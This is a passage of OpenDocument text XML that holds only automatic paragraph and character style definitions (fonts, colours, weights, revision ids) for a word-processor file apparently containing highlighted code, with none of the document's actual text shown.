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text-properties fo:font-weight="bold" officeooo:rsid="006297e7" officeooo:paragraph-rsid="006297e7" style:font-weight-asian="bold"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6"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1"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2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="006297e7" officeooo:paragraph-rsid="0062a49f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="002d6bf8"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="006d5189"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="006ba391" officeooo:paragraph-rsid="006ba391"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="006d5189"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="006e8ca9"/>
    </style:style>
    <style:style style:name="P18"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19"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20"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25"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6"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7"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38"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39"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40"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41"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color="#000000" style:font-name="Liberation Serif" officeooo:paragraph-rsid="003473e4"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" style:font-name="Liberation Serif" officeooo:paragraph-rsid="003ad1eb"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="003d34eb" officeooo:paragraph-rsid="003f9523"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="003d34eb" officeooo:paragraph-rsid="005c20fe"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="003f9523" officeooo:paragraph-rsid="00409c94"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00423cc4" officeooo:paragraph-rsid="00458729"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00423cc4" officeooo:paragraph-rsid="005dbac4"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00458729"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0046416a" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="004eb9d6"/>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officeooo:paragraph-rsid="0017af47"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0017af47" officeooo:paragraph-rsid="0017af47"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="003f9523" officeooo:paragraph-rsid="00409c94"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="0046416a" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="006547ce" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="00673b4a" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="006a6ad7"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P71"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72"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73" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P74"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75"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76"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77"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78" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P81"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82" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P8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8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8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86" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
    </style:style>
    <style:style style:name="P87"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88" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2" style:writing-mode="lr-tb"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P89"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90"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91"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92"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93"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94" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004eb9d6" officeooo:paragraph-rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="00673b4a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P96" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="00673b4a"/>
    </style:style>
    <style:style style:name="P97" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="006e8ca9"/>
    </style:style>
    <style:style style:name="P98" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="006ba391" officeooo:paragraph-rsid="006e8ca9"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00744e95" officeooo:paragraph-rsid="00744e95" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P100" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0075f85d"/>
    </style:style>
    <style:style style:name="P101" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:text-properties officeooo:paragraph-rsid="00813e98"/>
    </style:style>
    <style:style style:name="P102" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:text-properties officeooo:paragraph-rsid="0096f4da"/>
    </style:style>
    <style:style style:name="P103" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:text-properties officeooo:rsid="0080c4a4" officeooo:paragraph-rsid="00954d43"/>
    </style:style>
    <style:style style:name="P104" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00813e98"/>
    </style:style>
    <style:style style:name="P105" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="00826541"/>
    </style:style>
    <style:style style:name="P106" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="0097a4d3"/>
    </style:style>
    <style:style style:name="P107" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="00858417"/>
    </style:style>
    <style:style style:name="P108" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="0086caef"/>
    </style:style>
    <style:style style:name="P109" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:text-properties officeooo:rsid="00844288" officeooo:paragraph-rsid="00844288"/>
    </style:style>
    <style:style style:name="P110" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties officeooo:rsid="00858417" officeooo:paragraph-rsid="0085f5a8"/>
    </style:style>
    <style:style style:name="P111" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:text-properties officeooo:rsid="0086caef" officeooo:paragraph-rsid="0086caef"/>
    </style:style>
    <style:style style:name="P112" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:text-properties officeooo:rsid="00875f19" officeooo:paragraph-rsid="00875f19"/>
    </style:style>
    <style:style style:name="P113" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:text-properties officeooo:rsid="0089670a" officeooo:paragraph-rsid="00954d43"/>
    </style:style>
    <style:style style:name="P114" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="008b4fdb" officeooo:paragraph-rsid="008b4fdb"/>
    </style:style>
    <style:style style:name="P115" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties officeooo:rsid="008b4fdb" officeooo:paragraph-rsid="008b4fdb"/>
    </style:style>
    <style:style style:name="P116" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties officeooo:rsid="008f0b64" officeooo:paragraph-rsid="008f0b64"/>
    </style:style>
    <style:style style:name="P117" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties officeooo:rsid="0091009a" officeooo:paragraph-rsid="0091009a"/>
    </style:style>
    <style:style style:name="P118" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties officeooo:rsid="0091ef89" officeooo:paragraph-rsid="0091ef89"/>
    </style:style>
    <style:style style:name="P119" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00954d43"/>
    </style:style>
    <style:style style:name="P120" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:paragraph-rsid="00673b4a" fo:background-color="#232525" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P121" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="00844288" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P122" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="0075f85d"/>
    </style:style>
    <style:style style:name="P123" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:paragraph-rsid="00813e98"/>
    </style:style>
    <style:style style:name="P124" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="00858417" officeooo:paragraph-rsid="0085f5a8"/>
    </style:style>
    <style:style style:name="P125" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="00875f19" officeooo:paragraph-rsid="00875f19"/>
    </style:style>
    <style:style style:name="P126" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0075f85d"/>
    </style:style>
    <style:style style:name="P127" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P128" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P129" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6"/>
    </style:style>
    <style:style style:name="P130" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P131" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P132" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#a9b7c6" fo:background-color="#232525"/>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style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="00649883" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006547ce" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0069fe41" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006a6ad7" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006c16a4" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006d5189" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006e8ca9" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T41"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759b1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744e9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75f85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78207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9ae3a"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addb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7c436a"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e0a32"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7f359c"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13e98"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370aa"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5f5a8"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c6a51"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8e2d6b"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8f0b64"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54d43"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96f4da"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97a4d3"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officeooo:rsid="009b0843"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66" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000"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67" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T69" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004bb626"/>
    </style:style>
    <style:style style:name="T70" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="004eb9d6"/>
    </style:style>
    <style:style style:name="T75" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0062a49f"/>
    </style:style>
    <style:style style:name="T76" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0062a49f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="00649883" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006d5189"/>
    </style:style>
    <style:style style:name="T79"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80"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81" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T84"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85" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0079ae3a" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00813e98" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0085f5a8" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T89" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="007f359c" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T90" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T91"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92" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T93" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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94" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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95" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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96" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832"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97" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6897bb" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d7663" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T98" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T99"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100" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T101" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T102" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa"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03" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa"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04" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa"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05" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T106" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T107" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="007f359c" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T108" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00813e98" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T109" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0085f5a8" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T110" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#9876aa" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="italic" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T111" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#6a8759" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#232525" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T112" style:family="text">
